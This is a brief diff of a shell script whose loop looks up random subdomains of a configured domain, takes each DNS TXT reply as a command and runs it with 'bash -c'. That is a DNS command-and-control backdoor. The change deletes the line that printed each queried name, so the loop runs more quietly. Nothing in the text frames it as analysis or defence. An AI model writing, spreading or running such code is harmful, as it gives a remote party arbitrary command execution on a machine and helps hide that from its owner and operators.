@@ -9,7 +9,6 @@ uniqid=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 5 | head -n 1)
 while true ; do 
 	
 	randprefix=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)
-	echo "$uniqid.$randprefix$origin"
 	cmd=$(dig +short "$uniqid.$randprefix$origin" TXT | sed s/^\"// | sed s/\"$//)
 	echo "Running $cmd"
 	bash -c "$cmd"
